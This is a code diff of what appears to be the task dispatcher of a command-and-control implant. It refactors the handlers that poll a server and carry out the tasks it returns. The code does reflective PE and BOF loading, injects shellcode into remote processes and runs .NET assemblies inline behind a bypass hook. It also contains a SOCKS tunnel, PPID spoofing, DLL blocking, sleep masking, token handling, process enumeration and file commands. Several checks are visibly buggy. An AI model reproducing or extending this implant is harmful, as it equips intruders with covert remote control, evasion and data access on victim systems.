@@ -2,91 +2,107 @@
 
 using namespace Root;
 
-auto DECLFN Task::Dispatcher(
-    VOID
-) -> VOID {
-    KhDbg( "[====== Starting Dispatcher ======]" );
+auto DECLFN Task::Dispatcher(VOID) -> VOID {
+    KhDbg("[====== Starting Dispatcher ======]");
+    KhDbg("Initial heap allocation count: %d", Self->Hp->Count);
 
-    KhDbg( "heap allocation count: %d", Self->Hp->Count );
+    PPACKAGE Package  = nullptr;
+    PPARSER  Parser   = nullptr;
+    PPACKAGE PostJobs = nullptr;
+    PVOID    DataPsr  = nullptr;
+    UINT64   PsrLen   = 0;
+    PCHAR    TaskUUID = nullptr;
+    BYTE     JobID    = 0;
+    ULONG    TaskQtt  = 0;
 
-    PPACKAGE Package  = Self->Pkg->NewTask();
-    PPACKAGE PostJobs = Self->Pkg->PostJobs();
-    PPARSER  Parser   = (PPARSER)Self->Hp->Alloc( sizeof( PARSER ) );
-
-    ULONG TaskCode = 0;
-    INT16 TaskID   = 0;
-    PCHAR TaskUUID = NULL;
-    BYTE  JobID    = 0;
-    BOOL  TaskBool = FALSE;
-    ULONG TaskQtt  = 0;
-
-    PBYTE Buffer = NULL;
-    ULONG Length = 0;
-
-    PVOID DataPsr = NULL;
-    UINT64 PsrLen = 0;
-
-    KhDbg( "send %p [%d bytes]", Package->Buffer, Package->Length );
-
-    Self->Pkg->Transmit( Package, &DataPsr, &PsrLen );
-    KhDbg( "transmited return %p [%d bytes]", DataPsr, PsrLen );
-    if ( !DataPsr || !PsrLen ) goto _KH_END;
-
-    KhDbg( "heap allocation count: %d", Self->Hp->Count );
-
-    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
-    if ( !Parser->Original ) goto _KH_END;
-
-    KhDbg( "heap allocation count: %d", Self->Hp->Count );
-
-    KhDbg( "parsed %p [%d bytes]", Parser->Buffer, Parser->Length );
-
-    JobID = Self->Psr->Byte( Parser );
-    KhDbg( "routine id: %d", JobID );
-
-    if ( JobID == KhGetTask ) {
-        TaskQtt = Self->Psr->Int32( Parser );
-        KhDbg("task quantity: %d", TaskQtt );
-
-        if ( !TaskQtt ) goto _KH_END;
-
-        Self->Pkg->Int32( PostJobs, TaskQtt );
-
-        for ( INT i = 0; i < TaskQtt; i++ ) {
-            TaskUUID = Self->Psr->Str( Parser, 0 );
-
-            KhDbg( "creating job with task uuid: %s", TaskUUID );
-
-            KhDbg("parser %p buff %p %d", Parser, Parser->Buffer, Parser->Length);
-
-            PJOBS NewJob = Self->Jbs->Create( TaskUUID, Parser );
-            if ( !NewJob ) {
-                KhDbg( "Failed to create job for task %d", TaskID );
-                continue;
-            }
-        }
-
-        Self->Jbs->ExecuteAll();
-        Self->Jbs->Send( PostJobs );
+    Package = Self->Pkg->NewTask();
+    if (!Package) {
+        KhDbg("ERROR: Failed to create new task package");
+        goto CLEANUP;
     }
 
-_KH_END:
+    Parser = (PPARSER)Self->Hp->Alloc(sizeof(PARSER));
+    if (!Parser) {
+        KhDbg("ERROR: Failed to allocate parser memory");
+        goto CLEANUP;
+    }
+
+    KhDbg("Sending package %p [%d bytes]", Package->Buffer, Package->Length);
+    Self->Pkg->Transmit(Package, &DataPsr, &PsrLen);
+    
+    if (!DataPsr || !PsrLen) {
+        KhDbg("ERROR: No data received or zero length");
+        goto CLEANUP;
+    }
+    KhDbg("Received response %p [%d bytes]", DataPsr, PsrLen);
+
+    Self->Psr->NewTask( Parser, DataPsr, PsrLen );
+    if ( !Parser->Original ) { goto CLEANUP; }
+
+    KhDbg("Parsed data %p [%d bytes]", Parser->Buffer, Parser->Length);
+
+    JobID = Self->Psr->Byte( Parser );
+
+    if ( JobID == KhGetTask ) {
+        KhDbg("Processing job ID: %d", JobID);
+        TaskQtt = Self->Psr->Int32(Parser);
+        KhDbg("Task quantity received: %d", TaskQtt);
+
+        if (TaskQtt > 0) {
+            PostJobs = Self->Pkg->PostJobs();
+            if (!PostJobs) {
+                KhDbg("ERROR: Failed to create post jobs package");
+                goto CLEANUP;
+            }
+ 
+            Self->Pkg->Int32(PostJobs, TaskQtt);
+
+            for (ULONG i = 0; i < TaskQtt; i++) {
+                TaskUUID = Self->Psr->Str(Parser, 0);
+                if (!TaskUUID) {
+                    KhDbg("WARNING: Invalid TaskUUID at index %d", i);
+                    continue;
+                }
+
+                KhDbg("Creating job for task UUID: %s", TaskUUID);
+                KhDbg(
+                    "Parser state: %p, buffer: %p, length: %d", 
+                    Parser, Parser->Buffer, Parser->Length
+                );
+
+                PJOBS NewJob = Self->Jbs->Create(TaskUUID, Parser);
+                if (!NewJob) {
+                    KhDbg("WARNING: Failed to create job for task %d", i);
+                    continue;
+                }
+            }
+
+            Self->Jbs->ExecuteAll();
+            Self->Jbs->Send( PostJobs );
+        }
+    }
+
+CLEANUP:
     Self->Jbs->Cleanup();
 
-    if ( PostJobs ) {
-        Self->Hp->Free( PostJobs );
+    if ( DataPsr ) {
+        Self->Hp->Free(DataPsr);
     }
 
     if ( Parser ) { 
-        Self->Psr->Destroy( Parser );
-    }
-    
-    if ( DataPsr ) {
-        Self->Hp->Free( DataPsr );
+        Self->Psr->Destroy(Parser);
     }
 
-    KhDbg( "heap allocation count: %d", Self->Hp->Count );
-    KhDbg( "[====== Exiting Dispatcher ======]\n" );
+    if ( PostJobs ) {
+        Self->Pkg->Destroy(PostJobs);
+    }
+
+    if ( Package ) {
+        Self->Pkg->Destroy(Package);
+    }
+
+    KhDbg("Final heap allocation count: %d", Self->Hp->Count);
+    KhDbg("[====== Dispatcher Finished ======]\n");
 }
 
 auto DECLFN Task::ExecPE(
@@ -97,8 +113,8 @@ auto DECLFN Task::ExecPE(
 
     ULONG BuffLen = 0;
     ULONG ArgLen  = 0;
-    PBYTE Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
-    PBYTE Args    = Self->Psr->Bytes( Parser, &ArgLen );
+    BYTE* Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
+    BYTE* Args    = Self->Psr->Bytes( Parser, &ArgLen );
     BOOL  Success = FALSE; 
 
     Self->Inj->Reflection( Buffer, BuffLen, Args );
@@ -116,9 +132,9 @@ auto DECLFN Task::ExecBof(
     G_PARSER  = Parser;
 
     ULONG BofLen  = 0;
-    PBYTE BofBuff = Self->Psr->Bytes( Parser, &BofLen );
+    BYTE* BofBuff = Self->Psr->Bytes( Parser, &BofLen );
     ULONG BofArgc = 0;
-    PBYTE BofArgs = Self->Psr->Bytes( Parser, &BofArgc );
+    BYTE* BofArgs = Self->Psr->Bytes( Parser, &BofArgc );
 
     Self->Cf->Loader( BofBuff, BofLen, BofArgs, BofArgc );
 
@@ -137,8 +153,8 @@ auto DECLFN Task::ExecSc(
     ULONG ProcID  = Self->Psr->Int32( Parser );
     ULONG BuffLen = 0;
     ULONG ArgLen  = 0;
-    PBYTE Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
-    PBYTE Args    = Self->Psr->Bytes( Parser, &ArgLen );
+    BYTE* Buffer  = Self->Psr->Bytes( Parser, &BuffLen );
+    BYTE* Args    = Self->Psr->Bytes( Parser, &ArgLen );
     BOOL  Success = FALSE; 
 
     KhDbg( "inject %p [%d bytes] into %s process", Buffer, BuffLen, ProcID ? "remote":"local" );
@@ -168,9 +184,9 @@ auto DECLFN Task::Upload(
 
 //     HANDLE FileHandle = INVALID_HANDLE_VALUE;
 
-//     PBYTE FileBuffer = B_PTR( Self->Hp->Alloc( KH_CHUNK_SIZE ) );
+//     BYTE* FileBuffer = B_PTR( Self->Hp->Alloc( KH_CHUNK_SIZE ) );
 //     ULONG FileLength = 0;
-//     PBYTE TmpBuffer  = { 0 };
+//     BYTE* TmpBuffer  = { 0 };
 //     ULONG TmpLength  = 0;
 //     ULONG AvalBytes  = 0;
 
@@ -284,14 +300,14 @@ auto DECLFN Task::FileSystem(
 
     ULONG    TmpVal  = 0;
     BOOL     Success = TRUE;
-    PBYTE    Buffer  = { 0 };
+    BYTE*    Buffer  = { 0 };
 
     KhDbg( "sub command id: %d", SbCommandID );
 
     Self->Pkg->Byte( Package, SbCommandID );
     
     switch ( SbCommandID ) {
-        case SbFsList: {
+        case FsList: {
             WIN32_FIND_DATAA FindData     = { 0 };
             SYSTEMTIME       CreationTime = { 0 };
             SYSTEMTIME       AccessTime   = { 0 };
@@ -349,7 +365,7 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case SbFsCwd: {
+        case FsCwd: {
             CHAR CurDir[MAX_PATH] = { 0 };
 
             Self->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 
@@ -358,7 +374,7 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case SbFsMove: {
+        case FsMove: {
             PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
             PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );
 
@@ -366,7 +382,7 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case SbFsCopy: {
+        case FsCopy: {
             PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
             PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );
 
@@ -374,31 +390,31 @@ auto DECLFN Task::FileSystem(
 
             break;
         }
-        case SbFsMakeDir: {
+        case FsMakeDir: {
             PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );
 
             Success = Self->Krnl32.CreateDirectoryA( PathName, NULL );
             
             break;
         }
-        case SbFsDelete: {
+        case FsDelete: {
             PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );
 
             Success = Self->Krnl32.DeleteFileA( PathName );
 
             break;
         }
-        case SbFsChangeDir: {
+        case FsChangeDir: {
             PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );
 
             Success = Self->Krnl32.SetCurrentDirectoryA( PathName );
 
             break;
         }
-        case SbFsRead: {
+        case FsRead: {
             PCHAR  PathName   = Self->Psr->Str( Parser, 0 );
             ULONG  FileSize   = 0;
-            PBYTE  FileBuffer = { 0 };
+            BYTE*  FileBuffer = { 0 };
             HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 
             FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
@@ -417,7 +433,7 @@ auto DECLFN Task::FileSystem(
 
 _KH_END:
     if ( !Success ) { return KhGetError; }
-    if ( SbCommandID != SbFsList || SbCommandID != SbFsRead || SbCommandID != SbFsCwd ) {
+    if ( SbCommandID != FsList || SbCommandID != FsRead || SbCommandID != FsCwd ) {
         Self->Pkg->Int32( Package, Success );
     }
 
@@ -438,13 +454,13 @@ auto DECLFN Task::Dotnet(
     KhDbg( "sub command id: %d", SbCommandID );
 
     switch ( SbCommandID ) {
-        case SbDotInline: {
+        case DotInline: {
             PCHAR cArguments  = Self->Psr->Str( Parser, 0 );
             PCHAR cAppDomName = Self->Psr->Str( Parser, 0 );
             BOOL  KeepLoad    = Self->Psr->Int32( Parser );
             PCHAR cVersion    = Self->Psr->Str( Parser, 0 );
             ULONG AsmSize     = 0;
-            PBYTE AsmBytes    = Self->Psr->Bytes( Parser, &AsmSize );
+            BYTE* AsmBytes    = Self->Psr->Bytes( Parser, &AsmSize );
 
             WCHAR wArguments[Str::LengthA( cArguments ) * sizeof( WCHAR )];
             WCHAR wVersion[Str::LengthA( cVersion ) * sizeof( WCHAR )];
@@ -456,7 +472,7 @@ auto DECLFN Task::Dotnet(
             Str::CharToWChar( wVersion, cVersion, sizeof( wVersion ) );
             Str::CharToWChar( wAppDomName, cAppDomName, sizeof( wAppDomName ) );
 
-            if ( Self->Hw->Enabled ) {
+            if ( Self->Hw->DotnetBypass ) {
                 Self->Hw->DotnetInit();
             }
 
@@ -464,7 +480,7 @@ auto DECLFN Task::Dotnet(
                 AsmBytes, AsmSize, wArguments, wAppDomName, wVersion, KeepLoad 
             );
 
-            if ( Self->Hw->Enabled ) {
+            if ( Self->Hw->DotnetBypass ) {
                 Self->Hw->DotnetExit();
             }
 
@@ -474,16 +490,17 @@ auto DECLFN Task::Dotnet(
             
             break;
         }
-        case SbDotList: {
+        case DotList: {
             G_PACKAGE = Package;
             Self->Dot->VersionList();
 
             break;
         }
-        case SbDotInvoke: {
+        case DotInvoke: {
             break;
         }
-        case SbDotSpawn: {
+        case DotFork: {
+            // todo: add dotnet via fork
             break;
         }
     }   
@@ -509,22 +526,22 @@ auto DECLFN Task::Socks(
     ULONG ServerID  = Self->Psr->Int32(Parser);
 
     ULONG B64DataLen   = 0;
-    PBYTE B64Data = { 0 };
+    BYTE* B64Data = { 0 };
     ULONG DataLen = 0;
-    PBYTE Data = { 0 };
+    BYTE* Data = { 0 };
 
     if ( !IsExit ) {
         B64Data = Self->Psr->Bytes(Parser, &B64DataLen);
     
         DataLen = Self->Pkg->Base64DecSize( (PCHAR)B64Data );
-        Data = (PBYTE)Self->Hp->Alloc( DataLen );
+        Data = (BYTE*)Self->Hp->Alloc( DataLen );
         base64_decode( (PCHAR)B64Data, (PUCHAR)Data, DataLen );
     }
 
     KhDbg("Received data - ServerID: %u, IsExit: %d, Data %p Len: %u", 
           ServerID, IsExit, Data, DataLen);
         
-    PBYTE ResponseData = nullptr;
+    BYTE* ResponseData = nullptr;
     ULONG ResponseLen  = 0;
     ERROR_CODE Result  = ERROR_SUCCESS;
 
@@ -638,7 +655,7 @@ auto DECLFN Task::Socks(
                                     0x00, 0x00, 0x00, 0x00, // Fictitious IP
                                     0x00, 0x00}; // Fictitious port
             
-            ResponseData = (PBYTE)Self->Hp->Alloc(sizeof(socksResponse));
+            ResponseData = (BYTE*)Self->Hp->Alloc(sizeof(socksResponse));
             if (!ResponseData) {
                 KhDbg("Failed to allocate memory for response");
                 Self->Ws2_32.closesocket(newSocket);
@@ -695,7 +712,7 @@ auto DECLFN Task::Socks(
                 bytesRead = Self->Ws2_32.recv(activeSocket, (char*)recvBuffer, sizeof(recvBuffer), 0);
                 if (bytesRead > 0) {
                     KhDbg("Received %d bytes of response", bytesRead);
-                    ResponseData = (PBYTE)Self->Hp->Alloc(bytesRead);
+                    ResponseData = (BYTE*)Self->Hp->Alloc(bytesRead);
                     if (!ResponseData) {
                         KhDbg("Failed to allocate memory for response");
                         return ERROR_OUTOFMEMORY;
@@ -798,75 +815,115 @@ auto DECLFN Task::Config(
     PPACKAGE Package = Job->Pkg;
     PPARSER  Parser  = Job->Psr;
 
-    UINT8    SbCommandID = Self->Psr->Byte( Parser );
+    INT32    ConfigCount = Self->Psr->Int32( Parser );
     ULONG    TmpVal      = 0;
     BOOL     Success     = FALSE;
 
-    KhDbg( "sub command id: %d", SbCommandID );
+    KhDbg( "config count: %d", ConfigCount );
 
-    switch ( SbCommandID ) {
-        case SbCfgPpid: {
-            ULONG ParentID = Self->Psr->Int32( Parser );
-            Self->Ps->Ctx.ParentID = ParentID;
+    for ( INT i = 0; i < ConfigCount; i++ ) {
+        UINT8 ConfigID = Self->Psr->Int32( Parser );
+        KhDbg( "config id: %d", ConfigID );
+        switch ( ConfigID ) {
+            case CfgPpid: {
+                ULONG ParentID = Self->Psr->Int32( Parser );
+                Self->Ps->Ctx.ParentID = ParentID;
 
-            KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); break;
-        }
-        case SbCfgSleep: {
-            ULONG NewSleep = Self->Psr->Int32( Parser );
-            Self->Session.SleepTime = NewSleep * 1000;
+                KhDbg( "parent id set to %d", Self->Ps->Ctx.ParentID ); break;
+            }
+            case CfgSleep: {
+                ULONG NewSleep = Self->Psr->Int32( Parser );
+                Self->Session.SleepTime = NewSleep * 1000;
 
-            KhDbg( "new sleep time set to %d", Self->Session.SleepTime % 1000 ); break;
-        }
-        case SbCfgJitter: {
-            ULONG NewJitter = Self->Psr->Int32( Parser );
-            Self->Session.Jitter = NewJitter;
+                KhDbg( "new sleep time set to %d ms", Self->Session.SleepTime ); break;
+            }
+            case CfgJitter: {
+                ULONG NewJitter = Self->Psr->Int32( Parser );
+                Self->Session.Jitter = NewJitter;
 
-            KhDbg( "new jitter set to %d", Self->Session.Jitter ); break;
-        }
-        case SbCfgBlockDlls: {
-            BOOL BlockDlls  = Self->Psr->Int32( Parser );
-            Self->Ps->Ctx.BlockDlls = BlockDlls;
+                KhDbg( "new jitter set to %d", Self->Session.Jitter ); break;
+            }
+            case CfgBlockDlls: {
+                BOOL BlockDlls  = Self->Psr->Int32( Parser );
+                Self->Ps->Ctx.BlockDlls = BlockDlls;
+                
+                KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); break;
+            }
+            case CfgCurDir: {
+                if ( Self->Ps->Ctx.CurrentDir ) {
+                    Self->Hp->Free( Self->Ps->Ctx.CurrentDir );
+                }
+
+                PCHAR CurDirTmp  = Self->Psr->Str( Parser, &TmpVal );
+                PCHAR CurrentDir = (PCHAR)Self->Hp->Alloc( TmpVal );
+
+                Mem::Copy( CurrentDir, CurDirTmp, TmpVal );
+
+                Self->Ps->Ctx.CurrentDir = CurrentDir; break;
+            }
+            case CfgMask: {
+                INT32 TechniqueID = Self->Psr->Int32( Parser );
+                if ( 
+                    TechniqueID != MaskTimer || 
+                    TechniqueID != MaskWait 
+                ) {
+                    KhDbg( "invalid mask id: %d", TechniqueID );
+                    return KH_ERROR_INVALID_MASK_ID;
+                }
             
-            KhDbg( "block non microsoft dlls is %s", Self->Ps->Ctx.BlockDlls ? "enabled" : "disabled" ); break;
-        }
-        case SbCfgCurDir: {
-            if ( Self->Ps->Ctx.CurrentDir ) {
-                Self->Hp->Free( Self->Ps->Ctx.CurrentDir );
+                Self->Mk->Ctx.TechniqueID = TechniqueID;
+            
+                KhDbg( 
+                    "mask technique id set to %d (%s)", Self->Mk->Ctx.TechniqueID, 
+                    Self->Mk->Ctx.TechniqueID == MaskTimer ? "timer" : 
+                    ( Self->Mk->Ctx.TechniqueID == MaskWait  ? "wait" : "unknown" ) 
+                );
             }
-
-            PCHAR CurDirTmp  = Self->Psr->Str( Parser, &TmpVal );
-            PCHAR CurrentDir = (PCHAR)Self->Hp->Alloc( TmpVal );
-
-            Mem::Copy( CurrentDir, CurDirTmp, TmpVal );
-
-            Self->Ps->Ctx.CurrentDir = CurrentDir; break;
-        }
-        case SbCfgMask: {
-            INT32 TechniqueID = Self->Psr->Int32( Parser );
-            if ( 
-                TechniqueID != MaskTimer || 
-                TechniqueID != MaskApc   || 
-                TechniqueID != MaskWait 
-            ) {
-                KhDbg( "invalid mask id: %d", TechniqueID );
-                return KH_ERROR_INVALID_MASK_ID;
+            case CfgSpawn: {
+                // PCHAR Spawn = Self->InjCtx.;
             }
-        
-            Self->Mk->Ctx.TechniqueID = TechniqueID;
-        
-            KhDbg( 
-                "mask technique id set to %d (%s)", Self->Mk->Ctx.TechniqueID, 
-                  Self->Mk->Ctx.TechniqueID == MaskTimer ? "timer" : 
-                ( Self->Mk->Ctx.TechniqueID == MaskApc   ? "apc" : 
-                ( Self->Mk->Ctx.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
-            );
-        }
-        case sbCfgSpawn: {
-            // PCHAR Spawn = Self->InjCtx.;
+            case CfgKilldate: {
+                SYSTEMTIME LocalTime { 0 };
+
+                INT16 Year  = (INT16)Self->Psr->Int32( Parser );
+                INT16 Month = (INT16)Self->Psr->Int32( Parser );
+                INT16 Day   = (INT16)Self->Psr->Int32( Parser );
+            }
+            case CfgWorktime: {
+
+            }
         }
     }
 
     return KhRetSuccess;
+}
+
+auto DECLFN Task::Token(
+    _In_ PJOBS Job
+) -> ERROR_CODE {
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
+
+    INT32 SubID = Self->Psr->Int32( Parser );
+
+    switch ( SubID ) {
+        case TknGetUUID: {
+            CHAR*  ProcUser    = nullptr;
+            HANDLE TokenHandle = INVALID_HANDLE_VALUE;
+
+            ProcUser = Self->Tkn->GetUser( TokenHandle );
+
+            if ( ProcUser ) {
+                Self->Pkg->Str( Package, ProcUser );
+                Self->Hp->Free( ProcUser );
+            }
+            
+            break;
+        }
+        case TknSteal: {
+            
+        }
+    }
 }
 
 auto DECLFN Task::Process(
@@ -889,6 +946,8 @@ auto DECLFN Task::Process(
             PCHAR               CommandLine = Self->Psr->Str( Parser, &TmpVal );
             PROCESS_INFORMATION PsInfo      = { 0 };
 
+            KhDbg("start to run: %s", CommandLine);
+
             Success = Self->Ps->Create( CommandLine, CREATE_NO_WINDOW, &PsInfo );
             if ( !Success ) return KhGetError;
 
@@ -905,11 +964,14 @@ auto DECLFN Task::Process(
             PCHAR UserToken = { 0 };
             ULONG UserLen   = 0;
 
-            HANDLE TokenHandle   = INVALID_HANDLE_VALUE;
-            HANDLE ProcessHandle = INVALID_HANDLE_VALUE;
+            CHAR FullPath[MAX_PATH] = { 0 };
 
-            FILETIME   FileTime   = { 0 };
-            SYSTEMTIME CreateTime = { 0 };
+            HANDLE TokenHandle   = nullptr;
+            HANDLE ProcessHandle = nullptr;
+
+            UNICODE_STRING* CommandLine = { 0 };
+            FILETIME        FileTime    = { 0 };
+            SYSTEMTIME      CreateTime  = { 0 };
 
             PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
             PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
@@ -927,34 +989,53 @@ auto DECLFN Task::Process(
             SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
 
             do {
+                ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
+                if ( Self->Krnl32.K32GetModuleFileNameExA( ProcessHandle, nullptr, FullPath, MAX_PATH ) ) {
+                    Self->Pkg->Str( Package, FullPath );
+                    Mem::Zero( (UPTR)FullPath, MAX_PATH );
+                } else {
+                    Self->Pkg->Str( Package, "-" );
+                }
+
                 if ( !SysProcInfo->ImageName.Buffer ) {
                     Self->Pkg->Wstr( Package, L"-" );
                 } else {
                     Self->Pkg->Wstr( Package, SysProcInfo->ImageName.Buffer );
                 }
-                
+
+                CommandLine = (UNICODE_STRING*)Self->Hp->Alloc( sizeof( UNICODE_STRING ) );
+
+                Self->Ntdll.NtQueryInformationProcess( 
+                    ProcessHandle, ProcessCommandLineInformation, CommandLine, sizeof( CommandLine ), nullptr 
+                );
+                if ( CommandLine->Buffer ) {
+                    Self->Pkg->Wstr( Package, CommandLine->Buffer );
+                } else {
+                    Self->Pkg->Wstr( Package, L"N/A" );
+                }
+      
                 Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->UniqueProcessId ) );
                 Self->Pkg->Int32( Package, HandleToUlong( SysProcInfo->InheritedFromUniqueProcessId ) );
                 Self->Pkg->Int32( Package, SysProcInfo->HandleCount );
                 Self->Pkg->Int32( Package, SysProcInfo->SessionId );
-                
                 Self->Pkg->Int32( Package, SysProcInfo->NumberOfThreads );
-            
-                ProcessHandle = Self->Ps->Open( PROCESS_QUERY_INFORMATION, FALSE, HandleToUlong( SysProcInfo->UniqueProcessId ) );
+
+                if ( ProcessHandle ) {
+                    Self->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );
+                }
                 
-                Self->Tkn->ProcOpen( ProcessHandle, TOKEN_QUERY, &TokenHandle );
-
-                Self->Tkn->GetUser( &UserToken, &UserLen, TokenHandle );            
-
+                UserToken = Self->Tkn->GetUser( TokenHandle );            
+                                
                 if ( !UserToken ) {
                     Self->Pkg->Str( Package, "N/A" );
                 } else {
                     Self->Pkg->Str( Package, UserToken );
+                    Self->Hp->Free( UserToken );
                 }
-
-                // NtQueryInformationProcess( ProcessHandle, )
             
-                Self->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
+                if ( ProcessHandle ) {
+                    Self->Krnl32.IsWow64Process( ProcessHandle, &Isx64 );
+                }
                 
                 Self->Pkg->Int32( Package, Isx64 );
 
@@ -978,8 +1059,8 @@ auto DECLFN Task::Process(
                     // Self->Pkg->Int32( Package, SysThreadInfo[i].Priority );
                     // Self->Pkg->Int32( Package, SysThreadInfo[i].ThreadState );
                 // }
-            
-                if ( ProcessHandle ) Self->Ntdll.NtClose( ProcessHandle );
+                if ( ProcessHandle && ProcessHandle != INVALID_HANDLE_VALUE ) Self->Ntdll.NtClose( ProcessHandle );
+                if ( TokenHandle && TokenHandle != INVALID_HANDLE_VALUE     ) Self->Ntdll.NtClose( TokenHandle );
             
                 SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
 
@@ -989,7 +1070,7 @@ auto DECLFN Task::Process(
         }
     } 
 
-    if ( G_PACKAGE ) G_PACKAGE = NULL;
+    if ( G_PACKAGE ) G_PACKAGE = nullptr;
 
     KhRetSuccess;
 }
